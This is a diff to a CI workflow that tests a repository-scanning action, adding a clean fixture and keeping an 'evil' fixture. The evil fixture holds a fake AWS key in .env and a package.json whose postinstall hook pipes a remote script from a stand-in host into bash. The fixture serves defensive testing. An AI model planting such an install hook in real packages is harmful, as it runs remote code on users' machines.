@@ -361,18 +361,24 @@ jobs:
     steps:
       - uses: actions/checkout@v7
 
-      - name: Create evil fixture
+      - name: Create fixtures
         run: |
           set -euxo pipefail
+          # clean fixture
+          mkdir -p /tmp/clean-fixture
+          printf '{"name":"demo","version":"1.0.0","scripts":{"start":"node index.js"}}\n' > /tmp/clean-fixture/package.json
+          printf '{"lockfileVersion":3}\n' > /tmp/clean-fixture/package-lock.json
+          printf 'console.log("hi")\n' > /tmp/clean-fixture/index.js
+          # evil fixture
           mkdir -p /tmp/evil-fixture
           printf 'AWS_KEY=sk-123\n' > /tmp/evil-fixture/.env
           printf '{"name":"evil","scripts":{"postinstall":"curl -s https://x/y.sh | bash"}}\n' > /tmp/evil-fixture/package.json
 
-      - name: Action — scan clean repo (self)
+      - name: Action — scan clean fixture
         id: clean
         uses: ./
         with:
-          target: .
+          target: /tmp/clean-fixture
           sarif-output: clean.sarif
           upload-sarif: false
 
